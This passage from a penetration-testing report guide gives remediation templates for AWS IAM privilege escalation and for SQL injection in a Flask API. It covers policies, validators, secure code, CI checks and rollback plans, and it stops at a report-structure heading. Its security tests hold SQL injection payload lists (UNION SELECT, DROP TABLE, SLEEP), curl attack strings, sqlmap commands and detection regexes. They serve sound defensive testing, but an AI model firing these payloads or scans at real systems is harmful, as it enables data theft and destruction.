+        "StringEquals": {
+          "iam:PassedToService": "lambda.amazonaws.com"
+        }
+      }
+    }
+  ]
+}
+JSON
+```
+
+**2. Implement Service Control Policies (SCPs)**
+
+[Unverified] SCPs require AWS Organizations and may not be available in all account configurations.
+
+```bash
+# Create SCP to prevent privilege escalation organization-wide
+cat > prevent_privesc_scp.json <<JSON
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Deny",
+      "Action": [
+        "iam:CreateAccessKey",
+        "iam:CreateUser",
+        "iam:PutUserPolicy",
+        "iam:AttachUserPolicy"
+      ],
+      "Resource": "*",
+      "Condition": {
+        "StringNotEquals": {
+          "aws:PrincipalArn": "arn:aws:iam::123456789012:role/AdminRole"
+        }
+      }
+    }
+  ]
+}
+JSON
+
+aws organizations create-policy \
+  --name PreventPrivilegeEscalation \
+  --type SERVICE_CONTROL_POLICY \
+  --content file://prevent_privesc_scp.json
+```
+
+**3. Implement Just-In-Time (JIT) Access**
+
+[Inference] JIT access patterns require custom implementation or third-party solutions in AWS.
+
+```python
+# Lambda function for JIT role assumption
+import boto3
+import json
+from datetime import datetime, timedelta
+
+def lambda_handler(event, context):
+    sts = boto3.client('sts')
+    
+    # Validate request
+    user = event['requestContext']['authorizer']['claims']['email']
+    role_arn = event['body']['role_arn']
+    justification = event['body']['justification']
+    
+    # Check approval (integrate with ticketing system)
+    if not is_approved(user, role_arn, justification):
+        return {'statusCode': 403, 'body': 'Not approved'}
+    
+    # Generate short-lived credentials (1 hour)
+    response = sts.assume_role(
+        RoleArn=role_arn,
+        RoleSessionName=f'jit-{user}-{datetime.now().strftime("%Y%m%d%H%M%S")}',
+        DurationSeconds=3600,
+        Tags=[
+            {'Key': 'User', 'Value': user},
+            {'Key': 'Justification', 'Value': justification}
+        ]
+    )
+    
+    # Log access
+    log_access(user, role_arn, justification)
+    
+    return {
+        'statusCode': 200,
+        'body': json.dumps({
+            'credentials': response['Credentials'],
+            'expiration': response['Credentials']['Expiration'].isoformat()
+        })
+    }
+```
+
+### Process Improvements
+
+**1. Implement IAM Policy Review Process**
+
+```bash
+# Create policy validation script
+cat > validate_policy.sh <<'BASH'
+#!/bin/bash
+POLICY_FILE=$1
+
+# Check for wildcard resources
+if grep -q '"Resource": "\*"' "$POLICY_FILE"; then
+    echo "[WARNING] Wildcard resource detected"
+fi
+
+# Check for wildcard actions
+if grep -q '"Action": "\*"' "$POLICY_FILE"; then
+    echo "[ERROR] Wildcard action detected"
+    exit 1
+fi
+
+# Check for iam:PassRole without conditions
+if grep -q 'iam:PassRole' "$POLICY_FILE" && ! grep -q '"Condition"' "$POLICY_FILE"; then
+    echo "[ERROR] iam:PassRole without conditions"
+    exit 1
+fi
+
+# Validate JSON syntax
+if ! jq empty "$POLICY_FILE" 2>/dev/null; then
+    echo "[ERROR] Invalid JSON"
+    exit 1
+fi
+
+# Use IAM Policy Simulator
+aws iam simulate-custom-policy \
+    --policy-input-list file://"$POLICY_FILE" \
+    --action-names iam:CreateUser iam:PutUserPolicy \
+    --output table
+
+echo "[OK] Policy validation passed"
+BASH
+
+chmod +x validate_policy.sh
+```
+
+**2. Integrate with CI/CD Pipeline**
+
+```yaml
+# .github/workflows/iam-validation.yml
+name: IAM Policy Validation
+
+on:
+  pull_request:
+    paths:
+      - 'iam-policies/**/*.json'
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      
+      - name: Setup AWS CLI
+        uses: aws-actions/configure-aws-credentials@v1
+        with:
+          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
+          aws-region: us-east-1
+      
+      - name: Validate IAM Policies
+        run: |
+          for policy in iam-policies/**/*.json; do
+            echo "Validating $policy"
+            ./validate_policy.sh "$policy"
+          done
+      
+      - name: Run IAM Access Analyzer
+        run: |
+          aws accessanalyzer validate-policy \
+            --policy-document file://iam-policies/new-policy.json \
+            --policy-type IDENTITY_POLICY
+```
+
+## Prevention Measures
+
+### Code Review Guidelines
+
+**IAM Policy Checklist:**
+
+- [ ] No wildcard (*) in Action unless absolutely necessary
+- [ ] Specific resources defined (no wildcard in Resource)
+- [ ] iam:PassRole has conditions restricting passed roles
+- [ ] High-privilege actions have IP/MFA conditions
+- [ ] Permission boundaries applied to users/roles
+- [ ] Trust policies specify exact principals
+- [ ] No hard-coded credentials in code/configs
+
+### Automated Detection
+
+**1. AWS Config Rules**
+
+```bash
+# Deploy AWS Config rule for iam:PassRole detection
+aws configservice put-config-rule --config-rule '{
+  "ConfigRuleName": "detect-unrestricted-passrole",
+  "Description": "Detects IAM policies with unrestricted iam:PassRole",
+  "Scope": {
+    "ComplianceResourceTypes": ["AWS::IAM::Policy", "AWS::IAM::Role"]
+  },
+  "Source": {
+    "Owner": "AWS",
+    "SourceIdentifier": "IAM_POLICY_NO_STATEMENTS_WITH_ADMIN_ACCESS"
+  }
+}'
+```
+
+**2. Custom CloudWatch Insights Query**
+
+```bash
+# Query for privilege escalation patterns
+cat > cloudwatch_query.txt <<'QUERY'
+fields @timestamp, userIdentity.principalId, eventName, requestParameters.roleName
+| filter eventName = "PassRole" or eventName = "CreateFunction" or eventName = "UpdateFunctionCode"
+| sort @timestamp desc
+| limit 100
+QUERY
+
+aws logs start-query \
+  --log-group-name /aws/cloudtrail/events \
+  --start-time $(date -d '1 hour ago' +%s) \
+  --end-time $(date +%s) \
+  --query-string file://cloudwatch_query.txt
+```
+
+**3. Prowler Security Checks**
+
+```bash
+# Run Prowler checks for IAM issues
+prowler aws --services iam --checks iam_no_root_access_key,iam_user_mfa_enabled,iam_policy_no_full_access
+
+# Continuous monitoring
+prowler aws --services iam --output-formats json,html --output-directory ./prowler-reports
+```
+
+### Training & Awareness
+
+**Security Training Topics:**
+
+1. **IAM Best Practices Workshop** (2 hours)
+    
+    - Least privilege principle
+    - Permission boundaries
+    - Trust policy security
+    - Real-world escalation scenarios
+2. **Secure Development Guidelines** (ongoing)
+    
+    - How to request AWS permissions
+    - Pre-deployment security checklist
+    - Incident response procedures
+3. **Monthly Security Reviews**
+    
+    - Review of recent IAM changes
+    - Discussion of security findings
+    - Threat intelligence updates
+
+## Verification & Testing
+
+### Regression Tests
+
+```bash
+# Test legitimate Lambda deployment still works
+./test_lambda_deploy.sh
+
+# Test application functionality
+./run_integration_tests.sh
+
+# Verify no production impact
+aws cloudwatch get-metric-statistics \
+  --namespace AWS/Lambda \
+  --metric-name Errors \
+  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%S) \
+  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
+  --period 3600 \
+  --statistics Sum
+```
+
+### Security Tests
+
+```bash
+# Attempt privilege escalation (should fail)
+cat > security_test.sh <<'BASH'
+#!/bin/bash
+set -e
+
+echo "[*] Testing privilege escalation prevention..."
+
+# Test 1: PassRole to high-privilege role
+echo "[*] Test 1: Attempting PassRole..."
+if aws lambda create-function \
+  --function-name security-test \
+  --role arn:aws:iam::123456789012:role/HighPrivilegeRole \
+  --runtime python3.9 \
+  --handler index.handler \
+  --zip-file fileb://test.zip 2>&1 | grep -q "AccessDenied"; then
+    echo "[PASS] PassRole correctly denied"
+else
+    echo "[FAIL] PassRole not blocked!"
+    exit 1
+fi
+
+# Test 2: Direct IAM user creation
+echo "[*] Test 2: Attempting IAM user creation..."
+if aws iam create-user --user-name test-user 2>&1 | grep -q "AccessDenied"; then
+    echo "[PASS] IAM user creation correctly denied"
+else
+    echo "[FAIL] IAM user creation not blocked!"
+    exit 1
+fi
+
+# Test 3: Permission boundary bypass attempt
+echo "[*] Test 3: Attempting permission boundary removal..."
+if aws iam delete-user-permissions-boundary --user-name developer-user 2>&1 | grep -q "AccessDenied"; then
+    echo "[PASS] Boundary removal correctly denied"
+else
+    echo "[FAIL] Boundary removal not blocked!"
+    exit 1
+fi
+
+echo "[+] All security tests passed"
+BASH
+
+chmod +x security_test.sh
+./security_test.sh
+```
+
+## Rollback Plan
+
+If remediation causes production issues:
+
+```bash
+# 1. Restore original policy (keep backup)
+aws iam put-user-policy \
+  --user-name developer-user \
+  --policy-name DeveloperPolicy \
+  --policy-document file://backup/original_policy.json
+
+# 2. Remove permission boundary temporarily
+aws iam delete-user-permissions-boundary \
+  --user-name developer-user
+
+# 3. Restore trust policy
+aws iam update-assume-role-policy \
+  --role-name HighPrivilegeRole \
+  --policy-document file://backup/original_trust_policy.json
+
+# 4. Document rollback
+echo "Rolled back at $(date)" >> rollback_log.txt
+echo "Reason: <production issue description>" >> rollback_log.txt
+```
+
+## References
+
+- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
+- AWS Security Best Practices: https://aws.amazon.com/architecture/security-identity-compliance/
+- CIS AWS Foundations Benchmark
+- Rhino Security Labs AWS IAM Privilege Escalation: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+- MITRE ATT&CK Cloud Matrix: https://attack.mitre.org/matrices/enterprise/cloud/ EOF
+
+````
+
+**Example 2: SQL Injection Remediation**
+
+```bash
+cat > remediation_sqli.md <<'EOF'
+# Remediation Recommendations: SQL Injection in User Search
+
+## Immediate Actions (Critical Path)
+
+1. **Deploy WAF Rule** (Priority: P0 - Immediate)
+```bash
+# AWS WAF SQL injection rule
+aws wafv2 create-web-acl \
+  --name block-sqli \
+  --scope REGIONAL \
+  --default-action Allow={} \
+  --rules '[
+    {
+      "Name": "BlockSQLi",
+      "Priority": 1,
+      "Statement": {
+        "SqliMatchStatement": {
+          "FieldToMatch": {
+            "AllQueryArguments": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "URL_DECODE"
+            },
+            {
+              "Priority": 1,
+              "Type": "HTML_ENTITY_DECODE"
+            }
+          ]
+        }
+      },
+      "Action": {"Block": {}},
+      "VisibilityConfig": {
+        "SampledRequestsEnabled": true,
+        "CloudWatchMetricsEnabled": true,
+        "MetricName": "BlockSQLi"
+      }
+    }
+  ]' \
+  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=block-sqli
+
+# Associate with API Gateway
+aws wafv2 associate-web-acl \
+  --web-acl-arn <web-acl-arn> \
+  --resource-arn <api-gateway-arn>
+````
+
+2. **Implement Input Validation** (Priority: P0 - Within 24h)
+
+```python
+# Temporary input sanitization (NOT a complete fix)
+import re
+
+def validate_username(username):
+    """Strict alphanumeric validation"""
+    if not re.match(r'^[a-zA-Z0-9_-]{1,50}$', username):
+        raise ValueError("Invalid username format")
+    return username
+
+@app.route('/api/search')
+def search():
+    try:
+        username = request.args.get('username', '')
+        username = validate_username(username)
+        # ... query logic ...
+    except ValueError as e:
+        return jsonify({'error': str(e)}), 400
+```
+
+3. **Enable Query Logging** (Priority: P0 - Immediate)
+
+```python
+# Enable MySQL general log temporarily (performance impact)
+import logging
+
+# Configure Python logging
+logging.basicConfig(level=logging.INFO)
+db_logger = logging.getLogger('sqlalchemy.engine')
+db_logger.setLevel(logging.INFO)
+
+# MySQL configuration
+# SET GLOBAL general_log = 'ON';
+# SET GLOBAL log_output = 'FILE';
+```
+
+## Short-Term Remediation (< 7 days)
+
+### Fix Implementation
+
+**PRIMARY FIX: Use Parameterized Queries**
+
+```python
+# BEFORE (Vulnerable):
+def search_user_vulnerable(username):
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    cursor.execute(query)
+    return cursor.fetchall()
+
+# AFTER (Fixed):
+def search_user_secure(username):
+    query = "SELECT * FROM users WHERE username = %s"
+    cursor.execute(query, (username,))
+    return cursor.fetchall()
+```
+
+**Complete Secure Implementation:**
+
+```python
+# secure_search.py
+from flask import Flask, request, jsonify
+import mysql.connector
+from mysql.connector import Error
+import re
+from functools import wraps
+
+app = Flask(__name__)
+
+# Database configuration (replace with secure secrets management in production)
+DB_CONFIG = {
+    "host": "localhost",
+    "database": "app_db",
+    "user": "app_user",
+    "password": "<strong_password>",
+    "autocommit": False,
+}
+
+def get_db_connection():
+    """Create secure database connection."""
+    try:
+        conn = mysql.connector.connect(**DB_CONFIG)
+        return conn
+    except Error as e:
+        app.logger.error(f"Database connection error: {e}")
+        raise
+
+def validate_input(param_name: str, pattern: str, max_length: int):
+    """Decorator for input validation."""
+    def decorator(f):
+        @wraps(f)
+        def wrapper(*args, **kwargs):
+            value = request.args.get(param_name, "")
+
+            # Length check
+            if len(value) > max_length:
+                return jsonify({"error": "Input too long"}), 400
+
+            # Pattern validation
+            if not re.match(pattern, value):
+                return jsonify({"error": "Invalid input format"}), 400
+
+            return f(*args, **kwargs)
+        return wrapper
+    return decorator
+
+@app.route("/api/search")
+@validate_input("username", r"^[a-zA-Z0-9_-]{1,50}$", 50)
+def search_user():
+    """Secure user search endpoint."""
+    username = request.args.get("username", "")
+
+    conn = None
+    cursor = None
+
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor(dictionary=True)
+
+        # Parameterized query (PRIMARY DEFENSE)
+        query = """
+            SELECT id, username, email, created_at
+            FROM users
+            WHERE username = %s
+        """
+
+        cursor.execute(query, (username,))
+        results = cursor.fetchall()
+
+        # Sanitize output (defense in depth)
+        for result in results:
+            result.pop("password_hash", None)
+            result.pop("reset_token", None)
+
+        app.logger.info(f"User search: username={username}, results={len(results)}")
+
+        return jsonify({
+            "success": True,
+            "results": results,
+            "count": len(results),
+        })
+
+    except Error as e:
+        app.logger.error(f"Database error: {e}")
+        # Generic error message (don't leak DB info)
+        return jsonify({"error": "Search failed"}), 500
+
+    finally:
+        if cursor:
+            cursor.close()
+        if conn:
+            conn.close()
+
+# Additional security headers
+@app.after_request
+def add_security_headers(response):
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["X-Frame-Options"] = "DENY"
+    response.headers["Content-Security-Policy"] = "default-src 'self'"
+    return response
+
+if __name__ == "__main__":
+    # For local testing only. Use a proper cert in production and a WSGI server (gunicorn/uWSGI).
+    app.run(host="0.0.0.0", port=5000, ssl_context="adhoc")
+````
+
+**ORM-Based Implementation (Additional Layer):**
+
+```python
+# Using SQLAlchemy ORM (prevents SQL injection by design)
+from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import and_, or_
+
+db = SQLAlchemy(app)
+
+class User(db.Model):
+    __tablename__ = 'users'
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(50), unique=True, nullable=False)
+    email = db.Column(db.String(100), nullable=False)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+@app.route('/api/search')
+@validate_input('username', r'^[a-zA-Z0-9_-]{1,50}$', 50)
+def search_user_orm():
+    username = request.args.get('username', '')
+    
+    # ORM automatically uses parameterized queries
+    users = User.query.filter(User.username == username).all()
+    
+    return jsonify({
+        'results': [{'id': u.id, 'username': u.username, 'email': u.email} 
+                    for u in users]
+    })
+````
+
+### Verification Steps
+
+```bash
+# Test legitimate searches work
+curl "https://api.example.com/api/search?username=testuser"
+
+# Test SQL injection is blocked (should return error/empty)
+curl "https://api.example.com/api/search?username=test' OR '1'='1"
+curl "https://api.example.com/api/search?username=test' UNION SELECT 1,2,3,4-- -"
+
+# Automated testing
+cat > test_sqli_fix.py <<'PYTHON'
+import requests
+
+BASE_URL = "https://api.example.com"
+
+injection_payloads = [
+    "admin' OR '1'='1",
+    "admin' UNION SELECT NULL-- -",
+    "admin'; DROP TABLE users-- -",
+    "admin' AND 1=1-- -",
+    "admin' UNION SELECT @@version-- -",
+]
+
+def test_sqli_fixed():
+    for payload in injection_payloads:
+        response = requests.get(f"{BASE_URL}/api/search", 
+                                params={'username': payload})
+        
+        # Should return 400 (validation error) or empty results
+        assert response.status_code in [400, 200], f"Unexpected status: {response.status_code}"
+        
+        if response.status_code == 200:
+            data = response.json()
+            # Should not return multiple users or error messages
+            assert len(data.get('results', [])) <= 1, "Possible SQL injection"
+            assert 'error' in data or len(data.get('results', [])) == 0, "Payload not blocked"
+        
+        print(f"[PASS] Blocked: {payload}")
+
+if __name__ == '__main__':
+    test_sqli_fixed()
+    print("[+] All SQL injection tests passed")
+PYTHON
+
+python3 test_sqli_fix.py
+```
+
+## Long-Term Remediation (30-90 days)
+
+### Architectural Changes
+
+**1. Database Least Privilege**
+
+```sql
+-- Create restricted application user
+CREATE USER 'app_user'@'%' IDENTIFIED BY '<strong_password>';
+
+-- Grant only SELECT on specific columns
+GRANT SELECT (id, username, email, created_at) ON app_db.users TO 'app_user'@'%';
+
+-- No INSERT, UPDATE, DELETE on sensitive tables
+-- No access to admin_users table
+REVOKE ALL PRIVILEGES ON app_db.admin_users FROM 'app_user'@'%';
+
+-- No INFORMATION_SCHEMA access
+REVOKE SELECT ON information_schema.* FROM 'app_user'@'%';
+
+-- Apply changes
+FLUSH PRIVILEGES;
+
+-- Verify permissions
+SHOW GRANTS FOR 'app_user'@'%';
+```
+
+**2. Implement Read-Only Replicas**
+
+```python
+# Separate read/write database connections
+from sqlalchemy import create_engine
+
+# Write connection (restricted to specific operations)
+write_engine = create_engine('mysql://write_user:pass@primary-db/app_db')
+
+# Read-only connection for searches
+read_engine = create_engine('mysql://read_user:pass@replica-db/app_db')
+
+def search_user(username):
+    # Use read-only replica
+    with read_engine.connect() as conn:
+        result = conn.execute(
+            text("SELECT id, username, email FROM users WHERE username = :username"),
+            {"username": username}
+        )
+        return result.fetchall()
+```
+
+**3. API Rate Limiting**
+
+```python
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+
+limiter = Limiter(
+    app,
+    key_func=get_remote_address,
+    default_limits=["200 per day", "50 per hour"]
+)
+
+@app.route('/api/search')
+@limiter.limit("10 per minute")
+@validate_input('username', r'^[a-zA-Z0-9_-]{1,50}$', 50)
+def search_user():
+    # ... implementation ...
+    pass
+```
+
+**4. Database Firewall/Monitoring**
+
+[Unverified] Specific implementation depends on database platform and available tools.
+
+```bash
+# AWS RDS: Enable Database Activity Streams
+aws rds modify-db-instance \
+  --db-instance-identifier production-db \
+  --enable-cloudwatch-logs-exports '["error","general","slowquery"]'
+
+# Azure: Enable Auditing
+az sql server audit-policy update \
+  --resource-group myResourceGroup \
+  --server myserver \
+  --state Enabled \
+  --storage-account mystorage
+```
+
+### Process Improvements
+
+**1. Secure Coding Standards**
+
+```markdown
+# SQL Injection Prevention Checklist
+
+## REQUIRED for all database queries:
+- [ ] Use parameterized queries/prepared statements
+- [ ] OR use ORM (SQLAlchemy, Django ORM, etc.)
+- [ ] Validate all user input with whitelist regex
+- [ ] Implement strict input length limits
+- [ ] Use database user with minimal privileges
+- [ ] Log all database queries in development
+
+## PROHIBITED:
+- [ ] String concatenation for SQL queries
+- [ ] Direct user input in WHERE clauses
+- [ ] Dynamic table/column names from user input
+- [ ] Stored procedures with dynamic SQL
+- [ ] eval() or exec() with database results
+
+## CODE REVIEW FOCUS:
+- Search for: cursor.execute(f"
+- Search for: cursor.execute("... " + variable
+- Search for: query = f"SELECT
+- Verify: All .execute() calls use tuple parameters
+```
+
+**2. Static Analysis Integration**
+
+```yaml
+# .github/workflows/security-scan.yml
+name: Security Scanning
+
+on: [push, pull_request]
+
+jobs:
+  bandit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Run Bandit (Python Security Linter)
+        run: |
+          pip install bandit
+          bandit -r . -f json -o bandit-report.json
+          # Fail on SQL injection patterns
+          bandit -r . -ll -ii -s B608 || exit 1
+
+  semgrep:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Run Semgrep
+        run: |
+          pip install semgrep
+          semgrep --config=p/sql-injection --error
+```
+
+**3. Dynamic Application Security Testing (DAST)**
+
+```bash
+# OWASP ZAP automated scan
+docker run -t owasp/zap2docker-stable zap-baseline.py \
+  -t https://api.example.com \
+  -r zap-report.html
+
+# SQLMap integration test (in staging only)
+sqlmap -u "https://staging-api.example.com/api/search?username=test" \
+  --batch --level=5 --risk=3 --dbms=mysql \
+  --technique=BEUSTQ --threads=5
+# Expected: No SQL injection found
+```
+
+## Prevention Measures
+
+### Automated Detection
+
+**1. Runtime Application Self-Protection (RASP)**
+
+```python
+# SQL injection detection middleware
+import re
+
+SQLI_PATTERNS = [
+    r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
+    r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
+    r"\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))",
+    r"((\%27)|(\'))union",
+    r"union.*select",
+    r"select.*from.*information_schema",
+]
+
+def detect_sqli_attempt(value):
+    """Detect SQL injection patterns"""
+    for pattern in SQLI_PATTERNS:
+        if re.search(pattern, str(value), re.IGNORECASE):
+            return True
+    return False
+
+@app.before_request
+def check_sqli():
+    for key, value in request.args.items():
+        if detect_sqli_attempt(value):
+            app.logger.warning(f"SQL injection attempt: {key}={value}, IP={request.remote_addr}")
+            return jsonify({'error': 'Invalid input detected'}), 400
+```
+
+**2. Database Query Monitoring**
+
+```python
+# Log and alert on suspicious queries
+from sqlalchemy import event
+from sqlalchemy.engine import Engine
+import time
+
+@event.listens_for(Engine, "before_cursor_execute")
+def receive_before_cursor_execute(conn, cursor, statement, parameters, context, executemany):
+    # Check for dangerous patterns
+    dangerous_keywords = ['DROP', 'DELETE', 'TRUNCATE', 'ALTER', 'GRANT']
+    
+    for keyword in dangerous_keywords:
+        if keyword in statement.upper():
+            app.logger.critical(f"DANGEROUS QUERY DETECTED: {statement}")
+            # Alert security team
+            send_security_alert(f"Dangerous SQL detected: {statement}")
+    
+    # Log all queries with execution time
+    conn.info.setdefault('query_start_time', []).append(time.time())
+    
+@event.listens_for(Engine, "after_cursor_execute")
+def receive_after_cursor_execute(conn, cursor, statement, parameters, context, executemany):
+    total = time.time() - conn.info['query_start_time'].pop(-1)
+    if total > 1.0:  # Slow query threshold
+        app.logger.warning(f"Slow query ({total:.2f}s): {statement}")
+```
+
+**3. Continuous Security Testing**
+
+```bash
+# Scheduled SQLMap scan (staging environment)
+cat > sqli_scan.sh <<'BASH'
+#!/bin/bash
+
+STAGING_URL="https://staging-api.example.com"
+REPORT_DIR="/var/log/security-scans"
+DATE=$(date +%Y%m%d)
+
+# Run SQLMap against all endpoints
+sqlmap -u "${STAGING_URL}/api/search?username=test" \
+  --batch --crawl=2 --random-agent \
+  --level=3 --risk=2 \
+  --output-dir="${REPORT_DIR}/sqlmap_${DATE}"
+
+# Check results
+if grep -q "injectable" "${REPORT_DIR}/sqlmap_${DATE}"/*.txt; then
+    echo "SQL injection vulnerability found!" | mail -s "ALERT: SQLi Detected" security@example.com
+    exit 1
+fi
+
+echo "No SQL injection vulnerabilities detected"
+BASH
+
+# Add to cron
+echo "0 2 * * * /usr/local/bin/sqli_scan.sh" | crontab -
+```
+
+### Training & Awareness
+
+**Developer Security Training Module: SQL Injection**
+
+**Session 1: Understanding SQL Injection (1 hour)**
+
+- How SQL injection works (demonstration)
+- Impact examples from real breaches
+- Common vulnerable code patterns
+- Secure coding alternatives
+
+**Session 2: Hands-on Secure Development (2 hours)**
+
+- Writing parameterized queries
+- Using ORMs correctly
+- Input validation strategies
+- Code review for SQL injection
+
+**Session 3: Testing & Prevention (1 hour)**
+
+- Using SQLMap for security testing
+- Static analysis tools
+- Continuous security integration
+- Incident response procedures
+
+**Quarterly Code Review Sessions**
+
+- Review recent code changes for SQL injection risks
+- Share lessons learned from security findings
+- Update secure coding guidelines
+
+## Verification & Testing
+
+### Regression Tests
+
+```python
+# test_api_functionality.py
+import pytest
+import requests
+
+BASE_URL = "https://api.example.com"
+
+def test_legitimate_search():
+    """Ensure normal searches still work"""
+    response = requests.get(f"{BASE_URL}/api/search", 
+                           params={'username': 'testuser'})
+    assert response.status_code == 200
+    data = response.json()
+    assert 'results' in data
+
+def test_special_characters_in_username():
+    """Test handling of valid special characters"""
+    valid_usernames = ['test-user', 'test_user', 'test123']
+    for username in valid_usernames:
+        response = requests.get(f"{BASE_URL}/api/search", 
+                               params={'username': username})
+        assert response.status_code == 200
+
+def test_empty_results():
+    """Test handling of no results"""
+    response = requests.get(f"{BASE_URL}/api/search", 
+                           params={'username': 'nonexistent_user_xyz'})
+    assert response.status_code == 200
+    data = response.json()
+    assert data['results'] == []
+
+def test_api_performance():
+    """Ensure fix doesn't impact performance"""
+    import time
+    start = time.time()
+    response = requests.get(f"{BASE_URL}/api/search", 
+                           params={'username': 'testuser'})
+    duration = time.time() - start
+    assert duration < 0.5  # Should respond within 500ms
+```
+
+### Security Tests
+
+```python
+# test_sqli_prevention.py
+import pytest
+import requests
+
+BASE_URL = "https://api.example.com"
+
+SQL_INJECTION_PAYLOADS = [
+    "admin' OR '1'='1",
+    "admin' OR '1'='1'-- -",
+    "admin' OR '1'='1'/*",
+    "admin' UNION SELECT NULL,NULL,NULL-- -",
+    "admin' UNION SELECT @@version,NULL,NULL-- -",
+    "admin'; DROP TABLE users-- -",
+    "admin' AND 1=1-- -",
+    "admin' AND 1=2-- -",
+    "1' ORDER BY 10-- -",
+    "admin' UNION SELECT table_name FROM information_schema.tables-- -",
+    "admin' AND SLEEP(5)-- -",
+    "admin' WAITFOR DELAY '0:0:5'-- -",
+]
+
+@pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
+def test_sql_injection_blocked(payload):
+    """Verify all SQL injection attempts are blocked"""
+    response = requests.get(f"{BASE_URL}/api/search", 
+                           params={'username': payload})
+    
+    # Should either reject input or return safe results
+    if response.status_code == 200:
+        data = response.json()
+        # Should not return multiple users (no OR injection)
+        assert len(data.get('results', [])) <= 1
+        # Should not contain error messages revealing DB info
+        assert 'mysql' not in str(data).lower()
+        assert 'syntax error' not in str(data).lower()
+    else:
+        # Input validation rejection is also acceptable
+        assert response.status_code == 400
+
+def test_no_information_disclosure():
+    """Ensure error messages don't leak database information"""
+    payloads = ["admin'", "admin''", "admin\\"]
+    
+    for payload in payloads:
+        response = requests.get(f"{BASE_URL}/api/search", 
+                               params={'username': payload})
+        
+        body = response.text.lower()
+        # Check for database-specific error messages
+        forbidden_strings = [
+            'mysql', 'postgres', 'sql server', 'oracle',
+            'syntax error', 'table', 'column', 'database',
+            'query', 'select', 'from', 'where'
+        ]
+        
+        for forbidden in forbidden_strings:
+            assert forbidden not in body, f"Information disclosure: {forbidden}"
+
+def test_timing_attack_prevention():
+    """Ensure consistent response times (blind SQL injection prevention)"""
+    import time
+    
+    # Test benign query
+    start = time.time()
+    requests.get(f"{BASE_URL}/api/search", params={'username': 'test'})
+    benign_time = time.time() - start
+    
+    # Test timing attack payload
+    start = time.time()
+    requests.get(f"{BASE_URL}/api/search", 
+                params={'username': "test' AND SLEEP(5)-- -"})
+    attack_time = time.time() - start
+    
+    # Response time should not differ significantly
+    assert abs(attack_time - benign_time) < 1.0, "Possible timing attack vector"
+```
+
+## Rollback Plan
+
+```bash
+# If remediation causes production issues:
+
+# 1. Revert to previous code version
+git revert <commit-hash>
+git push origin main
+
+# 2. Redeploy previous version
+./deploy.sh --version=previous --environment=production
+
+# 3. Keep WAF rules active (provides some protection)
+# Do NOT disable WAF during rollback
+
+# 4. Re-enable general query log to monitor exploitation
+mysql -u root -p -e "SET GLOBAL general_log = 'ON';"
+
+# 5. Document rollback
+cat >> rollback_log.txt <<LOG
+Rollback at: $(date)
+Reason: <describe production issue>
+Next steps: <remediation plan revision>
+LOG
+
+# 6. Implement emergency mitigation
+# Temporarily restrict endpoint to authenticated users only
+# or rate limit aggressively until permanent fix deployed
+```
+
+## Success Metrics
+
+```bash
+# Track remediation effectiveness
+
+# 1. Zero SQL injection findings in scans
+sqlmap -u "https://api.example.com/api/search?username=test" --batch
+# Expected: "all tested parameters do not appear to be injectable"
+
+# 2. Code coverage for security tests
+pytest --cov=app --cov-report=html tests/
+# Target: >95% coverage including SQLi test cases
+
+# 3. No SQL injection attempts succeeding
+# Monitor logs for blocked attempts
+grep "SQL injection attempt" /var/log/app/security.log | wc -l
+# Should show attempts being blocked, not succeeding
+
+# 4. Performance not degraded
+# Average response time should remain <500ms
+curl -w "@curl-format.txt" -o /dev/null -s "https://api.example.com/api/search?username=test"
+```
+
+## References
+
+- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
+- NIST SP 800-53: SI-10 Information Input Validation
+- PCI DSS Requirement 6.5.1: Injection Flaws
+- SQLAlchemy Documentation: https://docs.sqlalchemy.org/ EOF
+
+```
+
+---
+
+**Related Critical Topics:** Web Application Firewall (WAF) configuration, database security hardening, secure SDLC integration, vulnerability disclosure processes, incident response procedures for active exploitation.
+```
+
+---
+
+## Report Structure
+
+### Executive Summary
+
+**Purpose:** Provides non-technical stakeholders with high-level findings, business impact, and recommended actions. Written last but presented first.
+
+**Components:**
+
+- **Scope**: Brief description of assessment boundaries (target systems, timeframe, methodology)
+- **Key Findings Summary**: 3-5 most critical vulnerabilities with business impact
+- **Risk Rating Overview**: Aggregate statistics (e.g., "5 Critical, 12 High, 8 Medium, 3 Low")
+- **Recommended Actions**: Prioritized remediation steps with estimated timelines
+- **Overall Security Posture**: One-paragraph assessment
+
+**Template Structure:**
+
+```
+EXECUTIVE SUMMARY
+
+Assessment Period: [Dates]
+Scope: [Cloud environment, accounts, services tested]
+
+Critical Findings:
+1. [Vulnerability name] - [Business impact in 1 sentence]
+2. [...]
+
+Risk Distribution:
+- Critical: X findings
+- High: X findings  
+- Medium: X findings
+- Low: X findings
+
+Primary Recommendations:
+1. [Action] - Priority: Critical - Timeline: Immediate
+2. [...]
+
+Overall Assessment:
+[2-3 sentences on overall security posture and urgency]
+```
+
+### Technical Findings Section
+
+**Per-Finding Structure:**
+
